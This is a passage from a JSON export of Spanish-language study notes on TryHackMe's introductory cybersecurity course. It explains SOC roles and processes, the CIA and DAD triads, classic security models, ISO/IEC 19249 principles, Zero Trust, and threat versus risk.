    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/2. Defensive Security Intro/0. Defensive Security Intro]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/1. Defensive Security Intro/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/1-defensive-security-intro/1-redireccion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/1. Defensive Security Intro/1. Redireccion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 1. Defensive Security Intro",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 1. Introduction to cybersecurity -> 2. Deffensive Security Intro**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. People",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/2-soc-fundamentals/3-people/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/2. SOC Fundamentals/3. People.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 2. SOC Fundamentals",
    "content": "Sin importar cu√°nto evolucione la automatizaci√≥n de la mayor√≠a de actividades de seguridad, la gente en un SOC siempre ser√° importante. Una soluci√≥n de seguridad puede generar numerosas flags rojas, lo que puede generar mucho ruido.\n\nEn un SOC, con soluciones de seguridad sin intervenci√≥n humana, acabar√°s centr√°ndote demasiado en problemas m√°s irrelevantes. Es la gente la que ayuda a la soluci√≥n de seguridad a identificar amenazas reales.\n\nA la gente se la conoce como equipo SOC y se divide en:\n\n![[Pasted image 20251019211812.png]]\n\n- **Analista SOC (L1):** Cualquier cosa detectada por la soluci√≥n de seguridad pasar√° primero por estos analistas. Llevan a cabo disparos de alerta b√°sicos para determinar si una detecci√≥n es maliciosa. Reportan dichas detecciones por los canales correspondientes.\n- **Analista SOC (L2):** Algunas detecciones pueden requerir de investigaci√≥n m√°s exhaustiva. Los analistas de nivel 2 ayudan a los de nivel 1 a correlacionar la informaci√≥n de m√∫ltiples fuentes para realizar un an√°lisis como es debido.\n- **Analista SOC (L3):** Son profesionales con experiencia que buscan proactivamente cualquier indicador de amenaza y ayudan en las actividades de respuesta a incidentes.\n- **Ingeniero de Seguridad:** Los ingenieros de seguridad despliegan y configuran las soluciones de seguridad con las que trabajan los analistas y aseguran su funcionamiento correcto.\n- **Ingeniero de Detecci√≥n:** Las reglas de seguridad son la l√≥gica construida detr√°s de las soluciones de seguridad para detectar actividad maliciosa.\n- **Manager del SOC:** Gestiona los procesos que siguen los integrantes del SOC y ofrece apoyo. Se mantiene en contacto con el CISO (Chief Information Security Officer) de la organizaci√≥n para ofrecerle actualizaciones en la postura y esfuerzos del SOC.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Technology",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/2-soc-fundamentals/5-technology/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/2. SOC Fundamentals/5. Technology.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 2. SOC Fundamentals",
    "content": "Teniendo a la gente y los procesos correctos en su lugar nunca ser√≠a suficiente sin soluciones de seguridad para detecci√≥n y respuesta. La porci√≥n de tecnolog√≠a en los pilares del SOC se refiere a las soluciones de seguridad. Estas soluciones minimizan de forma eficiente el esfuerzo manual que realiza el equipo del SOC para detectar amenazas y responder a ellas.\n\nLa red de una organizaci√≥n consiste en m√∫ltiples dispositivos y aplicaciones. Como equipo de seguridad, detectar y responder individualmente a amenazas en cada uno de estos, requerir√≠a un esfuerzo y consumo de recursos importantes. Las soluciones de seguridad centralizan la informaci√≥n de los dispositivos o aplicaciones presentes en la red.\n\nVeamos algunas de estas soluciones:\n\n- **SIEM:** Security Information and Event Management es una herramienta popular usada en casi todos los entornos SOC. Esta recoge logs de varios dispositivos de red. Las reglas de detecci√≥n se configuran en la soluci√≥n SIEM, que contiene l√≥gica para identificar actividad sospechosa y nos alerta en caso de match.\n- **EDR:** Endpoint Detection and Response ofrece al equipo del SOC con visibilidad de las actividades de los dispositivos en tiempo real y su historial. Opera a nivel de endpoint y ofrece respuestas automatizables.\n- **Firewall:** Funciona puramente para la seguridad de la red y act√∫a como una barrera entre la red interna y externa. Monitoriza tr√°fico entrante y saliente y filtra cualquier tr√°fico no autorizado mediante reglas l√≥gicas. Tambi√©n tiene algunas funcionalidades de detecci√≥n que nos ayudan a bloquear tr√°fico antes de que llegue a la red interna.\n\nOtras muchas soluciones de seguridad juegan un papel clave en el entorno SOC, como los antivirus, EPP (Endpoint Protection Platform), IDS/IPS (Intrusion Detection/Prevention System), XDR, SOAR (Security Orchestration Automation and Response) y m√°s.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. SOC Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/2-soc-fundamentals/0-soc-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/2. SOC Fundamentals/0. SOC Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 2. SOC Fundamentals",
    "content": "[[1. Introduction to SOC]]\n[[2. Purpose and Components]]\n[[3. People]]\n[[4. Process]]\n[[5. Technology]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Purpose and Components",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/2-soc-fundamentals/2-purpose-and-components/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/2. SOC Fundamentals/2. Purpose and Components.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 2. SOC Fundamentals",
    "content": "El objetivo principal de un equipo SOC es mantener la Detecci√≥n y la respuesta intactas. El equipo cuenta con recursos en forma de soluciones de seguridad que les ayuda a conseguir dicho objetivo. Estos integran toda la red de la compa√±√≠a y los sistemas que moritorizar desde una localizaci√≥n centralizada.\n\n------------------------\n<h2>Detecci√≥n</h2>\n- **Detectar vulnerabilidades:** Una vulnerabilidad es una debilidad que un atacante puede explotar para llevar las cosas m√°s all√° de su nivel de permisos. Pueden ser descubiertas en el software de cualquier dispositivo. Aunque parchear las vulnerabilidades no es responsabilidad del SOC, las vulnerabilidades no arregladas afectan a la seguridad de toda la empresa.\n- **Detectar actividad no autorizada:** Considera el caso donde un atacante descubre el nombre de usuario y la contrase√±a de uno de los empleados y los usa para loguearse en el sistema de la compa√±√≠a. Es crucial detectarlo r√°pidamente antes de que cause da√±os. Algunas pistas pueden ser la localizaci√≥n geogr√°fica o la IP del equipo, por ejemplo.\n- **Detectar violaci√≥n de pol√≠ticas:** Una pol√≠tica de seguridad es un conjunto de reglas y procedimientos creados para ayudar a proteger la empresa contra amenazas de seguridad y a cumplir con la normativa vigente. Podr√≠an considerarse violaciones descargar software pirata o mandar archivos confidenciales de forma insegura.\n- **Detectar intrusiones:** Las intrusiones se refieren a acceso no autorizado a los sistemas y redes. Un escenario ser√≠a un atacante explotando nuestra aplicaci√≥n web. Otro ser√≠a visitar un sitio malicioso e infectar el ordenador.\n\n---------------------------\n<h2>Respuesta</h2>\n- **Soporte con respuesta de incidencias:** Una vez detectado el incidente, ciertos pasos se toman para responder a ellos. Incluye minimizar el impacto y realizar el an√°lisis de la causa ra√≠z del incidente. El equipo SOC tambi√©n ayuda al equipo IR a realizar estos pasos.\n\nHay tres pilares en un SOC. Con estos, un equipo SOC se vuelve maduro y eficiente detectando y respondiendo a diferentes incidentes. Estos pilares son **People**, **Process** y **Technology**.\n\n![[Pasted image 20251019205936.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Process",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/2-soc-fundamentals/4-process/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/2. SOC Fundamentals/4. Process.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 2. SOC Fundamentals",
    "content": "Ya hemos visto los roles y responsabilidades de diferentes individuos trabajando en un equipo SOC. Cada rol tiene sus propios procesos. Veamos algunos procesos importantes involucrados en un SOC.\n\n-------------------------\n<h2>Alert Triage</h2>\nEs la base del equipo SOC. La primera respuesta a cualquier alerta es realizar una clasificaci√≥n de criticidad (triage). Se enfoca en analizar la alerta espec√≠fica. Determina la severidad de la alerta y nos ayuda a priorizar. Se basa en responder a las 5 Ws: \n\n![[Pasted image 20251019220532.png]]\nUn ejemplo:\n\n>[!CAUTION] Alerta: Malware detectado en el Host George PC.\n\n| 5 Ws   | Answers                                                                                                                                                                                                                       |\n| ------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| What?  | A malicious file was detected on one of the hosts inside the organization‚Äôs network.                                                                                                                                          |\n| When?  | The file was detected at 13:20 on June 5, 2024.                                                                                                                                                                               |\n| Where? | The file was detected in the directory of the host: \"GEORGE PC\".                                                                                                                                                              |\n| Who?   | The file was detected for the user George.                                                                                                                                                                                    |\n| Why?   | After the investigation, it was found that the file was downloaded from a pirated software-selling website. The investigation with the user revealed that they downloaded the file as they wanted to use a software for free. |\n\n--------------------------\n<h2>Reporting</h2>\nLas alertas detectadas da√±inas necesitan escalarse a an√°lisis de m√°s alto nivel para una respuesta y soluci√≥n. Estas alertan se escalan como tickets y se asignan a la gente relevante. El reporte deber√≠a incluir las 5 Ws junto con un an√°lisis m√°s profundo y capturas de pantalla como prueba de la actividad.\n\n----------------------------\n<h2>Incident Response and Forensics</h2>\nA veces, las detecciones reportadas apuntan a actividades maliciosas que son cr√≠ticas. En estos casos, un equipo de alto nivel que inicia una respuesta. El incidente a veces requiere una investigaci√≥n forense que intenta averiguar la causa ra√≠z del incidente analizando un sistema o red.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction to SOC",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/2-soc-fundamentals/1-introduction-to-soc/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/2. SOC Fundamentals/1. Introduction to SOC.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 2. SOC Fundamentals",
    "content": "La tecnolog√≠a ha hecho nuestras vidas m√°s eficientes, pero esa eficiencia viene con una responsabilidad. Los miedos de los d√≠as modernos han evolucionado mucho. Los secretos o informaci√≥n cr√≠tica ya no se almacenan en medios f√≠sicos (como libretas) sino digitalmente. Por eso, cualquier irrupci√≥n no autorizada, p√©rdida o modificaci√≥n de esta informaci√≥n puede causar un inmenso da√±o.\n\nUn **SOC** (**S**ecurity **O**perations **C**enter) es una facilidad dedicada operada por un equipo de seguridad especializado. Este equipo intenta continuamente monitorizar la red y recursos de la organizaci√≥n para identificar actividad sospechosa o prevenir da√±os. Este equipo trabaja 24 horas al d√≠a 7 d√≠as a la semana.\n\n-------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Construir una base para el SOC.\n- Detecci√≥n y respuesta en el SOC.\n- El rol de la gente, los procesos y la tecnolog√≠a.\n- Ejercicio pr√°ctico.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "La seguridad se ha convertido en una prioridad para todas las empresas.Todas quieren afirmar que sus productos son seguros, pero ¬øpor qu√©?\n\nAntes de comenzar, es vital saber cu√°l es el adversario contra el que debemos proteger nuestros activos. ¬øTratas de evitar que un beb√© coja tu ordenador? ¬øO tratas de proteger un port√°til que contiene dise√±os t√©cnicos que valen millones de d√≥lares? Usar el mismo tipo de protecci√≥n ante diferentes adversarios puede ser rid√≠culo y contraproducente. Por esto, conocer a nuestro adversario es clave.\n\nEs imposible conseguir un estado de seguridad del 100%. Por eso debemos de tratar mejorar nuestra postura de seguridad para hacerlo cada vez m√°s dif√≠cil para los adversarios.\n\n--------------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Explicar las funciones de seguridad: Confidencialidad, Integridad y Disponibilidad (Availability), CIA.\n- Presentar la tr√≠ada opuesta a CIA: Divulgaci√≥n, Alteraci√≥n y Destrucci√≥n/Denegaci√≥n (DAD).\n- Presentar los conceptos fundamentales de los modelos de seguridad como el modelo Bell-LaPadula.\n- Explicar principios de seguridad como Defensa en Profundidad, Zero Trust y Trust but Verify.\n- Introducir a ISO/IEC 19249.\n- Explicar las diferencias principales entre vulnerabilidad, amenaza y riesgo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. DAD",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/3-dad/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/3. DAD.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "La forma de atacar un sistema puede ser de varias maneras y estas vienen dadas por la tr√≠ada opuesta a la CIA:\n\n- **Divulgaci√≥n:** Lo contrario a la confidencialidad.\n- **Alteraci√≥n:** Es lo contrario de integridad.\n- **Destrucci√≥n/Denegaci√≥n:** Es lo contrario de disponibilidad.\n\n![[Pasted image 20251030153045.png]]\n\nConsideremos el ejemplo anterior de los pacientes:\n\n- **D:** Si un atacante roba exitosamente informaci√≥n confidencial, habr√° ocurrido un disclosure of confidential data.\n- **A:** Imagina la gravedad de la situaci√≥n si un atacante consigue modificar el registro sanitario de un paciente y no existen m√©todos para detectarlo.\n- **D:** Con un ataque DoS o DDoS, que deja inoperativo el servidor de registros se deja de poder prestar servicio hasta que se resuelva.\n\nProtegerse contra DAD es como trabajar en el desarrollo de la protecci√≥n CIA, de m√°xima necesidad.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. CIA",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/2-cia/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/2. CIA.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "Antes de describir algo como seguro, debemos considerar qu√© hace que algo lo sea. Cuando quieres juzgar la seguridad de un sistema debes pensar en la tr√≠ada de la seguridad: CIA.\n\n- **Confidencialidad:** Se asegura de que s√≥lo las personas destinadas a hacerlo puedan acceder a la informaci√≥n.\n- **Integridad:** Busca asegurar que la informaci√≥n no ha sido alterada, adem√°s, podemos detectar cualquier alteraci√≥n si ocurre.\n- **Disponibilidad (Availability):** Intenta asegurar que el sistema o servicio est√© disponible si se necesita.\n\n![[Pasted image 20251030145704.png]]\n\nConsideremos la CIA relacionada a registros de pacientes y sistemas relacionados:\n\n- **C:** De acuerdo a varias leyes modernas, los proveedores de servicios de salud deben asegurar y mantener la confidencialidad de registros m√©dicos.\n- **I:** Si el registro de un paciente se altera de forma accidental o con intenciones maliciosas, puede recibir un tratamiento err√≥neo, lo que puede conllevar un peligro para el paciente y multas millonarias para la empresa.\n- **A:** Cuando un paciente visita una cl√≠nica, el sistema debe estar disponible. Si no, el practicante no podr√≠a acceder al registro de salud del paciente, lo que impedir√≠a el tratamiento.\n\nEl √©nfasis no necesita se el mismo en las tres funciones de seguridad, por ejemplo, un anuncio de la universidad no es confidencial pero necesita expresamente que sea √≠ntegro.\n\n----------------------------\n<h2>M√°s all√° de CIA</h2>\nYendo un paso m√°s all√° en la CIA, podemos pensar en:\n\n- **Authenticity:** Trata de asegurar que el documento/archivo/informaci√≥n pertenece a la fuente que dice.\n- **Nonrepudiation:** Significa que la fuente original no puede denegar ser la emisora de la informaci√≥n.\n\nSin estas dos los negocios no se pueden llevar a cabo. Ya que si te llega un pedido tienes que estar seguro de que efectivamente ese pedido ha sido el realizado y la fuente que emiti√≥ el pedido no puede denegar haberlo hecho.\n\n----------------------------\n<h2>Parkerian Hexad</h2>\nEn 1998, Donn Parker propuso la h√©xada parkera. Cuenta con seis elementos de seguridad:\n\n1. **Availability.**\n2. **Utility:** Se enfoca en la utilidad de la informaci√≥n. Por ejemplo si se pierde la clave de acceso a un dispositivo. Puede que el dispositivo siga disponible, pero no tiene utilidad porque no se puede acceder a la informaci√≥n, esta no es usable.\n3. **Integrity.**\n4. **Authenticity.**\n5. **Confidentiality.**\n6. **Possession:** Requiere que la informaci√≥n no sea tomada, copiada o controlada sin autorizaci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. ISO - IEC 19249",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/6-iso-iec-19249/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/6. ISO - IEC 19249.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "La Organizaci√≥n Internacional de Estandarizaci√≥n (Standarization), ISO, y la Comisi√≥n Internacional Electrot√©cnica, IEC, han creado la ISO/IEC 19249. En esta tarea veremos brevemente la *\"ISO/IEC 19249:2017  Information technology - Security techniques - Catalogue of architectural and design principles for secure products, systems and applications\"*.\n\nLa ISO/IEC 19249 lista 5 principios de arquitectura:\n\n1. **Domain Separation:** Cada conjunto de componentes relacionados est√°n agrupados en una sola entidad. Cada entidad tendr√° su propio dominio y se le asignar√°n un conjunto de atributos de seguridad comunes.\n2. **Layering:** Cuando un sistema est√° estructurado en varios niveles o capas abstractos, se vuelve posible imponer pol√≠ticas de seguridad diferentes dependiendo del nivel.\n3. **Encapsulation:** En programaci√≥n orientada a objetos (OOP), escondemos implementaciones de bajo nivel y prevenimos la manipulaci√≥n directa de la informaci√≥n en un objeto ofreciendo m√©todos para ese prop√≥sito.\n4. **Redundancy:** Este principio asegura la disponibilidad y la integridad. Redundancia implica tener m√°s de una forma de comprobar.\n5. **Virtualization:** Con el aumento de los servicios en la nube, se ha popularizado la virtualizaci√≥n. Esta implica compartir el mismo hardware a lo largo de m√∫ltiples sistemas operativos.\n\nLa ISO/IEC 19249 ense√±a 5 principios de dise√±o:\n\n1. **Least Privilege:** Tambi√©n se puede refrasear como \"necesidad para saber lo necesario\". El principio establece que alguien tendr√≠a que tener privilegios para cumplir con su tarea y nada m√°s.\n2. **Attack Surface Minimisation:** Siempre hay alguna vulnerabilidad, algunas conocidas, otras por descubrir. El punto est√° en reducir en medida de lo posible la posibilidad de que est√©n ah√≠, por ejemplo deshabilitando todos los servicios que no se usen.\n3. **Centralized Parameter Validation:** Muchas de las vulnerabilidades se deben a los sistemas recibiendo input de los usuarios. Si estos no se sanitizan ni validan, pueden usarse para explotar un sistema.\n4. **Centralized General Security Services:** Como principio de seguridad, deber√≠amos abogar por centralizar los sistemas y servicios de seguridad.\n5. **Preparing for Error and Exception Handling:** Siempre que construimos un sistema deber√≠amos tener en cuenta que errores y excepciones ocurrir√°n por lo que es fundamental tenerlo en cuenta y prepararse a priori.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Defence-in-Depth",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/5-defence-in-depth/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/5. Defence-in-Depth.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "La defensa en profundidad se refiere a crear un sistema de seguridad con m√∫ltiples niveles. Por eso es que tambi√©n se llama Seguridad Multinivel.\n\nConsidera la siguiente analog√≠a: has cerrado un caj√≥n donde guardas tus documentos y objetos m√°s valiosos. El caj√≥n est√° bloqueado, sin embargo, ¬øquieres que la cerradura del caj√≥n sea lo √∫nico que lo protege? Si pensamos en seguridad multinivel, preferir√≠amos que el caj√≥n estuviese cerrado, la habitaci√≥n cerrada, la puerta del apartamento cerrada, la puerta del edificio cerrada e incluso instalar alguna c√°mara de seguridad. Aunque estos m√∫ltiples niveles de seguridad pueden no parar a un ladr√≥n comprometido, bloquear√°n a la mayor√≠a y se lo pondr√°n muy dif√≠cil al que lo consiga (si alguno lo consigue).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Zero Trust versus Trust but Verify",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/7-zero-trust-versus-trust-but-verify/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/7. Zero Trust versus Trust but Verify.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "La confianza es un tema complejo. En realidad no podemos funcionar sin confianza. Sin embargo, necesitamos algunos principios de gu√≠a. Dos de nuestro inter√©s son:\n\n- Conf√≠a pero verifica.\n- No conf√≠es.\n\n- **Trust but Verify:** Este principio ense√±a que deber√≠amos siempre verificar incluso cuando confiamos en una entidad y su comportamiento.\n- **Zero Trust:** Este principio trata la confianza como una vulnerabilidad. Es como decir \"nunca conf√≠es, verifica siempre\".\n\nLa micro-segmentaci√≥n es una de las implementaciones del Zero Trust. Se refiere al dise√±o donde un segmento de red puede ser tan peque√±o como un solo host. Adem√°s la comunicaci√≥n entre segmentos requiere autentificaci√≥n, control de acceso y otras medidas de seguridad.\n\nHay un l√≠mite sobre cu√°nto podemos aplicar este principio sin perjudicar el negocio, sin embargo, esto no quiere decir que deber√≠amos no aplicarlo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Fundamental Concepts of Security Models",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/4-fundamental-concepts-of-security-models/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/4. Fundamental Concepts of Security Models.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "¬øC√≥mo podemos crear un sistema que asegure una o m√°s funciones de seguridad? La respuesta es con modelos de seguridad. En esta tarea, introduciremos 3 modelos de seguridad fundamental:\n\n- Modelo Bell-LaPadula\n- Modelo de Integridad Biba\n- Modelo Clark-Wilson\n\n-------------------------------\n<h2>Modelo Bell-LaPadula</h2>\nEl modelo Bell-LaPadula busca conseguir **confidencialidad** especificando tres reglas:\n\n- **Simple Security Property:** Esta propiedad se llama \"no read up\". Establece que un sujeto con un nivel de seguridad inferior no puede leer un objeto con nivel de seguridad superior.\n- **Star Security Property:** Esta propiedad se llama \"no write down\". Establece que un sujeto con un nivel superior de seguridad no puede escribir en un objeto en un nivel inferior de seguridad.\n- **Discretionary-Security Property:** Esta propiedad usa una matriz de acceso para permitir operaciones de lectura y escritura. Debajo hay un ejemplo de matriz.\n\n| Sujetos  | Object A      | Object B   |\n| -------- | ------------- | ---------- |\n| Sujeto 1 | Escribir      | Sin acceso |\n| Sujeto 2 | Leer/Escribir | Leer       |\nLas dos primeras reglas se pueden resumir como \"write up, read down\". Este modelo tiene ciertas limitaciones, ya que no fue dise√±ado para compartir archivos, por ejemplo.\n\n![[Pasted image 20251102143815.png]]\n\n-------------------------------------\n<h2>Modelo Biba</h2>\nEL modelo Biba busca conseguir **integridad** especificando dos reglas:\n\n- **Simple Integrity Property:** Esta propiedad se llama \"no read down\". Un sujeto de integridad superior no debe poder leer de un objeto con nivel de integridad inferior.\n- **Star Integrity Property:** Esta propiedad se llama \"no write up\". Establece que un sujeto con un nivel inferior de integridad no debe poder escribir en un objeto de nivel de integridad superior.\n\nEstas dos propiedades pueden ser resumidas como \"read up, write down\". Esta regla est√° en contraste con el modelo Bell-LaPadula, lo que no deber√≠a sorprendernos ya que uno se ocupa de la confidencialidad y otro de la integridad. Una de las limitaciones de este modelo es que no puede manejar amenazas internas.\n\n![[Pasted image 20251102143806.png]]\n\n----------------------------\n<h2>Modelo Clark-Wilson</h2>\nEl modelo Clark-Wilson intenta conseguir integridad siguiendo los siguientes conceptos:\n\n- **Constrained Data Item (CDI):** Se refiere al tipo de informaci√≥n cuya integridad queremos preservar.\n- **Unconstrained Data Item (UDI):** Se refiere a todos los tipos de informaci√≥n m√°s all√° del CDI, como el input del usuario y del sistema.\n- **Transformation Procedures (TPs):** Estos procedimientos son operaciones programadas, como leer y escribir, y deber√≠an mantener la integridad de  los CDIs.\n- **Integrity Verification Procedures (IVPs):** Estos procedimientos comprueban y aseguran la validez de los CDIs.\n\nHemos cubierto s√≥lo tres modelos de seguridad, pero hay muchos m√°s, aqu√≠ algunos ejemplos:\n\n- Brewer and Nash\n- Goguen-Meseguer\n- Sutherland\n- Graham-Denning\n- Harrison-Ruzzo-Ullman",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Threat versus Risk",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/8-threat-versus-risk/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/8. Threat versus Risk.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "Hay tres t√©rminos que necesitamos aclarar para evitar confusiones.\n\n- **Vulnerabilidad:** Significa que algo es susceptible de ser atacado o da√±ado.\n- **Amenaza:** Es un peligro asociado a una vulnerabilidad.\n- **Riesgo:** Implica la probabilidad de que un actor malicioso explote la vulnerabilidad e impacte el negocio.\n\nPor ejemplo, trabajas en un hospital que usa una base de datos en particular para guardar los registros m√©dicos. Un d√≠a sale una nueva vulnerabilidad en la base de datos que usas. Y no s√≥lo eso, sino que junto con esa vulnerabilidad sale un PoC (Proof of Concept), lo que ayuda a los atacantes a realizar el ataque. Por este motivo el riesgo es alto.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Security Principles",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/0-security-principles/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/0. Security Principles.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/1. Introduction]]\n [[2. CIA]]\n [[3. DAD]]\n [[4. Fundamental Concepts of Security Models]]\n [[5. Defence-in-Depth]]\n [[6. ISO - IEC 19249]]\n [[7. Zero Trust versus Trust but Verify]]\n [[8. Threat versus Risk]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Careers in Cyber",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/2-careers-in-cyber/0-careers-in-cyber/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/2. Careers in Cyber/0. Careers in Cyber.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 2. Careers in Cyber",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/0. Careers in Cyber]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/2. Careers in Cyber/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/2-careers-in-cyber/1-redireccion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/2. Careers in Cyber/1. Redireccion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 2. Careers in Cyber",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 1. Introduction to cybersecurity -> 3. Careers in Cyber**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Metasploit - Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/2-metasploit-introduction/0-metasploit-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/2. Metasploit - Introduction/0. Metasploit - Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 2. Metasploit - Introduction",
    "content": "[[1. Introduction to Metasploit]]\n[[2. Main Components of Metasploit]]\n[[3. Msfconsole]]\n[[4. Working with Modules]]",
